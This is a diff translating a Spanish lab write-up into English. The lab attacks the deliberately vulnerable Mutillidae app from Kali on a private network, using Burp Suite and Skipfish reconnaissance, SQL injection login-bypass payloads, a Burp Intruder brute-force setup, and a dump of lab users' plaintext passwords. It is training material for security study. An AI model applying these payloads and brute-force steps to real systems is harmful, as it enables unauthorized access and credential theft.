@@ -6,7 +6,7 @@
 
 ---
 
-## 📋 Índice
+## 📋 Index
 
 1. [Lab Configuration](#1-lab-configuration)
 2. [Phase 1: Reconnaissance](#2-phase-1-reconnaissance)
@@ -22,22 +22,22 @@
 
 ---
 
-## 1. Configuración del Laboratorio
+## 1. Lab Configuration
 
-### 1.1 Arquitectura de Red
+### 1.1 Network Architecture
 ```
 ┌─────────────────┐
 │   Kali Linux    │ 192.168.0.30
-│   (Atacante)    │
+│   (Attacker)    │
 └────────┬────────┘
-         │ Red Bridge
+         │ Bridged Network
          │
 ┌────────▼────────────────┐
 │ Ubuntu Mutillidae       │
-│ ens33: 192.168.0.21     │ ← Red Externa (DMZ)
-│ ens37: 192.168.8.131    │ ← Red Interna
+│ ens33: 192.168.0.21     │ ← External Network (DMZ)
+│ ens37: 192.168.8.131    │ ← Internal Network
 └────────┬────────────────┘
-         │ Red Host-Only
+         │ Host-Only Network
          │
 ┌────────▼────────────────┐
 │  Metasploitable         │
@@ -45,16 +45,16 @@
 └─────────────────────────┘
 ```
 
-### 1.2 Especificaciones Técnicas
+### 1.2 Technical Specifications
 
-| Máquina | Interfaz | Red | IP | Gateway |
+| Machine | Interface | Network | IP | Gateway |
 |---------|----------|-----|----|---------|
 | **Kali Linux** | eth0 | Bridge | 192.168.0.30 | 192.168.0.1 |
 | **Ubuntu Mutillidae** | ens33 | Bridge | 192.168.0.21 | 192.168.0.1 |
 |  | ens37 | Host-Only | 192.168.8.131 | - |
 | **Metasploitable** | eth0 | Host-Only | 192.168.8.133 | - |
 
-### 1.3 Configuración de VMware
+### 1.3 VMware Configuration
 
 #### Kali Linux:
 ```
@@ -77,54 +77,54 @@
 2. Adapter 1: Custom (VMnet1 - Host-only)
 ```
 
-### 1.4 Verificación de Conectividad
+### 1.4 Connectivity Verification
 
-**Desde Kali:**
+**From Kali:**
 ```bash
-# Verificar IP propia
+# Verify own IP
 ip addr show eth0
-# Resultado esperado: 192.168.0.30
+# Expected result: 192.168.0.30
 
-# Verificar conectividad a Mutillidae (DMZ)
+# Verify connectivity to Mutillidae (DMZ)
 ping -c 4 192.168.0.21
-# ✅ Debe funcionar
+# ✅ Should work
 
-# Intentar alcanzar Metasploitable (red interna)
+# Attempt to reach Metasploitable (internal network)
 ping -c 4 192.168.8.133
-# ❌ NO debe funcionar (sin pivoting)
+# ❌ Should NOT work (without pivoting)
 ```
 
-**Desde Ubuntu Mutillidae:**
+**From Ubuntu Mutillidae:**
 ```bash
-# Verificar interfaces
+# Verify interfaces
 ip addr show
 
-# Resultado esperado:
+# Expected result:
 # ens33: 192.168.0.21/24
 # ens37: 192.168.8.131/24
 
-# Verificar conectividad a Kali
+# Verify connectivity to Kali
 ping -c 4 192.168.0.30
-# ✅ Debe funcionar
+# ✅ Should work
 
-# Verificar conectividad a Metasploitable
+# Verify connectivity to Metasploitable
 ping -c 4 192.168.8.133
-# ✅ Debe funcionar
+# ✅ Should work
 ```
 
 ---
 
-## 2. Fase 1: Reconocimiento
+## 2. Phase 1: Reconnaissance
 
-### 2.1 Configuración de Burp Suite
+### 2.1 Burp Suite Configuration
 
-#### En Kali:
+#### On Kali:
 ```bash
-# Iniciar Burp Suite
+# Start Burp Suite
 burpsuite &
 ```
 
-#### Configuración del Proxy:
+#### Proxy Configuration:
 ```
 1. Burp Suite → Proxy → Options
 2. Proxy Listeners:
@@ -133,34 +133,34 @@ burpsuite &
 3. Intercept Server Responses: ✅
 ```
 
-#### Configurar Firefox:
+#### Configure Firefox:
 ```
-1. Firefox → Preferencias → General
-2. Configuración de red → Configuración
-3. Configuración manual del proxy:
-   - Proxy HTTP: 127.0.0.1
-   - Puerto: 8080
-   - Usar también para HTTPS
-4. Aceptar
+1. Firefox → Preferences → General
+2. Network Settings → Settings
+3. Manual proxy configuration:
+   - HTTP Proxy: 127.0.0.1
+   - Port: 8080
+   - Also use this proxy for HTTPS
+4. OK
 ```
 
-### 2.2 Navegación Manual con Burp Suite
+### Manual Navigation with Burp Suite
 ```bash
-# En Firefox (con proxy configurado):
+# In Firefox (with proxy configured):
 http://192.168.0.21/mutillidae
 ```
 
-**Acciones realizadas:**
-1. Navegar por el menú principal
-2. Visitar páginas de OWASP 2017:
+**Actions performed:**
+1. Navigate through main menu
+2. Visit OWASP 2017 pages:
    - A1 - Injection → User Info (SQL)
    - A1 - Injection → Login
    - A7 - XSS → Reflected
    - Others → File Upload
-3. Probar formularios de login
-4. Explorar diferentes secciones
+3. Test login forms
+4. Explore different sections
 
-**Resultado en Burp Suite:**
+**Result in Burp Suite:**
 ```
 Burp Suite → Target → Site map
 
@@ -182,18 +182,18 @@ http://192.168.0.21
 
 ---
 
-### 2.3 Escaneo Automatizado con Skipfish
+### 2.3 Automated Scanning with Skipfish
 ```bash
-# Desde Kali:
+# From Kali:
 skipfish -YO -o ~/Desktop/skipfish_resultados http://192.168.0.21/mutillidae/index.php
 ```
 
-**Parámetros:**
-- `-Y`: Omitir confirmaciones
-- `-O`: Omitir página de inicio
-- `-o`: Directorio de salida
+**Parameters:**
+- `-Y`: Skip confirmation prompts
+- `-O`: Skip home page
+- `-o`: Output directory
 
-**Resultado:**
+**Result:**
 ```
 [+] Scan statistics:
     Duration: 15m 23s
@@ -208,7 +208,7 @@ skipfish -YO -o ~/Desktop/skipfish_resultados http://192.168.0.21/mutillidae/ind
     Low risk: 89
 ```
 
-**Ver resultados:**
+**View results:**
 ```bash
 firefox ~/Desktop/skipfish_resultados/index.html
 ```
@@ -217,25 +217,25 @@ firefox ~/Desktop/skipfish_resultados/index.html
 ![Skipfish vulnerabilidades](../img/skipfish-resultados2.jpg)
 ---
 
-## 3. Fase 2: Explotación Web
+## Phase 2: Web Exploitation
 
-### 3.1 Ataque de Fuerza Bruta con Burp Suite
+### 3.1 Brute Force Attack with Burp Suite
 
-#### Paso 1: Capturar petición de login
+#### Step 1: Capture login request
 ```bash
 # En Burp Suite:
 Proxy → Intercept is ON
 
-# En Firefox:
+# In Firefox:
 http://192.168.0.21/mutillidae/index.php?page=login.php
 
-# Introducir credenciales de prueba:
+# Enter test credentials:
 Username: usuario123
 Password: pass123
-Click en "Login"
+Click "Login"
 ```
 
-**Petición capturada en Burp:**
+**Captured request in Burp:**
 ```http
 POST /mutillidae/index.php?page=login.php HTTP/1.1
 Host: 192.168.0.21
@@ -251,26 +251,26 @@ username=usuario123&password=pass123&login-php-submit-button=Login
 
 ---
 
-#### Paso 2: Modificar petición (SQL Injection)
+#### Step 2: Modify request (SQL Injection)
 
-**Petición original:**
+**Original request:**
 ```
 username=usuario123&password=pass123&login-php-submit-button=Login
 ```
 
-**Petición modificada:**
+**Modified request:**
 ```
 username=admin' OR '1'='1&password=cualquiercosa&login-php-submit-button=Login
 ```
 
-**En Burp Suite:**
+**In Burp Suite:**
 ```
-1. Modificar el parámetro username
-2. Click en "Forward"
+1. Modify username parameter
+2. Click "Forward"
 3. Intercept is OFF
 ```
 
-**Resultado en Firefox:**
+**Result in Firefox:**
 ```
 ✅ Logged In Admin: admin (g0t r00t?)
 ```
@@ -279,23 +279,23 @@ username=admin' OR '1'='1&password=cualquiercosa&login-php-submit-button=Login
 ![Iniciamos sesión como admin](../img/burp-login-admin.jpg)
 ---
 
-#### Paso 3: Fuerza Bruta con Burp Intruder
+#### Step 3: Brute Force with Burp Intruder
 
-**Configurar ataque:**
+**Configure attack:**
 ```
 1. Burp Suite → Proxy → HTTP history
-2. Buscar petición POST a login.php
-3. Click derecho → Send to Intruder
+2. Find POST request to login.php
+3. Right-click → Send to Intruder
 4. Intruder → Positions
-5. Click en "Clear §" (limpiar marcadores)
-6. Seleccionar manualmente:
+5. Click "Clear §" (clear markers)
+6. Manually select:
 
 username=§usuario123§&password=§pass123§&login-php-submit-button=Login
 
 7. Attack type: Cluster bomb
 ```
 
-**Configurar payloads:**
+**Configure payloads:**
 ```
 Intruder → Payloads
 
@@ -318,46 +318,45 @@ Payload set 2 (password):
 - test
 ```
 
-**Iniciar ataque:**
+**Start attack:**
 ```
-Click en "Start attack"
+Click "Start attack"
 ```
 
-**Resultados:**
+**Results:**
 ```
 Request | Payload 1   | Payload 2    | Status | Length
 --------|-------------|--------------|--------|-------
 45      | estefania   | estefania123 | 302    | 459  ← Exitoso
 12      | admin       | admin        | 200    | 59645  ← Fallido
 23      | john        | monkey       | 200    | 59645  ← Fallido
-...otros intentos...  | 200    | 59645  ← Fallidos
+...other attempts...  | 200    | 59645  ← Fallidos
 ```
 
-**Identificar login exitoso:**
-- Status code: **302** (redirección)
-- Length: **Diferente** al resto (459 vs 59645)
-
+**Identify successful login:**
+- Status code: **302** (redirect)
+- Length: **Different** from others (459 vs 59645)
 
 ![Ataque Burpsuite exitoso](../img/ataque-burp-exito.jpg)
 ---
 
-### 3.2 SQL Injection - Extracción de Datos
+### 3.2 SQL Injection - Data Extraction
 
-#### Navegación a la página vulnerable:
+#### Navigate to vulnerable page:
 ```
 Firefox → http://192.168.0.21/mutillidae
 OWASP 2017 → A1 - Injection (SQL) → SQLi - Extract Data → User Info (SQL)
 ```
 
-#### 3.2.1 Obtener todos los usuarios
+#### 3.2.1 Get all users
 
 **Payload:**
 ```sql
 ' OR 1=1-- 
 ```
 
-**Campo:** Name
-**Resultado:** 26 usuarios con contraseñas en texto plano
+**Field:** Name
+**Result:** 26 users with plaintext passwords
 ```
 Username    Password    Signature
 admin       admin       g0t r00t?
@@ -370,7 +369,7 @@ jim         password    Rome did not create a great empire by having meetings...
 pablo       letmein     
 dave        password    
 adrian      somepassword
-... [16 usuarios más]
+... [16 more users]
 ```
 
 
